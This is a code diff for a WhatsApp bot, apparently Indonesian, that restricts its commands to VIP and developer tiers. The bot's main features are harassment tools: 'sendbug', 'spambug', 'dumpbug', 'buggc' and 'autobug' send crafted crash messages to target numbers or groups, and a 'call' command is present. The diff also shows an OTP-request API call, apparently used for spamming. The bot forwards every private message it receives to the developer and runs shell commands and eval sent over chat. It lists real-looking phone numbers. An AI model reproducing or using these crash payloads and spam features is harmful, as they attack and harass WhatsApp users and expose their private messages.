@@ -19,7 +19,7 @@ const isCmd = body.startsWith(prefix)
 const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
 const args = body.trim().split(/ +/).slice(1)
 const dn = args.join(' ')
-const nomorOwner = ['6285866295942','6282265058541','628895137788','6285865662584','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767']
+const nomorOwner = ['6285866295942','6289686044386','6282265058541','628895137788','6285865662584','6285727091924','6282296368892','6282225962567','4915510151395','628999890587','6282221840767']
 const isGroup = from.endsWith('@g.us')
 const botNumber = semar.user.id.split(':')[0]
 const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
@@ -64,7 +64,7 @@ axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requ
 if (body && !isGroup && !msg.key.fromMe && !isDev) {
 semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}
 
-if (body.startsWith(`$`)){ if (!isOwner && !msg.key.fromMe) return
+if (body.startsWith(`$`)){ if (!isDev && !msg.key.fromMe) return
 let evl = body.split("\n")
 let exc = body.replace(evl[0]+"\n", "")
 exec(exc, (err, stdout, stderr) => {
@@ -72,13 +72,13 @@ if (stdout) return reply(`${stdout}`)
 if (stderr) return reply(`${stderr}`)
 if (err) return reply(`${err}`)})}
 	    
-if (/^=?>/.test(body) && (isOwner || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
+if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
 try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
 return reply(require('util').format(evaluate))} catch(e){
 return reply(require('util').format(e))}}
 
 if (isCmd) { await semar.readMessages([msg.key]) }
-if (isCmd && !isOwner && !msg.key.fromMe) { if (mode === false) return reply('saat ini bot sedang dalam mode private\nbot hanya dapat digunakan oleh owner') }
+if (isCmd && !isOwner && !msg.key.fromMe) { if (mode === false) return reply('saat ini bot sedang dalam mode private\nbot hanya dapat digunakan oleh vip') }
 if (!mode) { if (!isOwner && !msg.key.fromMe) return }
 switch (command) {
 //©from: dennis
@@ -140,6 +140,7 @@ break
 
 //©from: dennis × ivan
 case 'sendbug':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
 if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}sendbug ${senderNumber}|10`)
 if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
@@ -161,6 +162,7 @@ break
 
 //©from: dennis × andik
 case 'dumpbug':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}dumpbug ${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}dumpbug ${senderNumber}`)
 if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
@@ -173,6 +175,7 @@ break
 
 //©from: dennis × ivan × andik
 case 'spambug':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
 if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}spambug ${senderNumber}|10`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
 if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
@@ -189,7 +192,7 @@ break
 
 //©from: dennis x haikal
 case 'buggc':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
 requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: msg.chat })
 semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
@@ -199,7 +202,7 @@ break
 
 //©from: dennis
 case 'autobug':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (args.length < 1) return sendButMessage(from, `silahkan pilih opsi berikut`, '', [{ buttonId: `autobug on`, buttonText: { displayText: "ON" }, type: 1},{ buttonId: `autobug off`, buttonText: { displayText: "OFF" }, type: 1}], {quoted:msg})
 if (dn === 'on'){ autobug = true
 reply('Sukses')
@@ -224,7 +227,7 @@ break
 
 //©from: dennis
 case 'chat':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 if (!dn) return reply(`Silahkan masukkan nomor dan pesan!\nContoh: ${prefix}chat ${senderNumber}|halo`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}chat ${senderNumber}|halo`)
 if (args[0].startsWith('8')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}spambug ${senderNumber}|10`)
@@ -238,36 +241,38 @@ break
 
 //©from: dennis
 case 'join':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 let result = args[0].split('https://chat.whatsapp.com/')[1]
 await semar.groupAcceptInvite(result).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
 break
 
 //©from: dennis
 case 'leave':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 await semar.groupLeave(from).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
 break
 
 //©from: dennis
 case 'delete': case 'd': case 'del':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
 semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
 break
 
 //©from: dennis
 case 'restart':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
 break
 
 //©from: dennis
 case 'shutdown':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
 break
 
 //©from: dennis × mr_dark
 case 'call':
+if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh VIP!')
 if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}call +${senderNumber}`)
 if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
 if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}call +${senderNumber}`)
@@ -278,16 +283,16 @@ break
 
 //©from: dennis
 case 'public':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 mode = true
-reply('Sukses')
+reply('Sukses mengubah ke mode public')
 break
 
 //©from: dennis
 case 'private':
-if (!isOwner && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
+if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
 mode = false
-reply('Sukses')
+reply('Sukses mengubah ke mode private')
 break
 
 //©from: dennis
